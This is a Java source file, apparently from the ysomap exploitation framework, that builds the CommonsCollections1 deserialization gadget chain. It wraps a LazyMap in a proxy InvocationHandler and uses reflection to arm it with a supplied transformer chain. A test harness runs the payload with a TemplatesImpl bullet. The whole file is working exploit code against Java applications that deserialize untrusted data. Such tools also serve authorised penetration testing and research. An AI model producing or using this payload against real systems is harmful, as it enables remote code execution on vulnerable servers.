package ysomap.gadget.payload.collections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;
import ysomap.PayloadTester;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
import ysomap.gadget.payload.Payload;
import ysomap.util.PayloadHelper;
import ysomap.util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * ysoserial 的 CommonsCollections3 也可以用这个
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Authors({ Authors.FROHOFF })
@Dependencies({"commons-collections:commons-collections:3.2.1","jdk7"})
public class CommonsCollections1 extends Payload<InvocationHandler> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof org.apache.commons.collections.Transformer[];
    }

    @Override
    public InvocationHandler pack(Object obj) throws Exception {
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        final Map mapProxy = PayloadHelper.createMemoitizedProxy(lazyMap, Map.class);

        final InvocationHandler handler = PayloadHelper.createMemoizedInvocationHandler(mapProxy);

        Reflections.setFieldValue(transformerChain, "iTransformers", obj); // arm with actual transformer chain

        return handler;
    }

    public static void main(String[] args) {
        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null,3);
//        new PayloadTester(CommonsCollections1.class).run();//ysoserial CommonsCollections1
        new PayloadTester(CommonsCollections1.class)// ysoserial CommonsCollections3
                .setBullet(bullet)
                .run();
    }
}
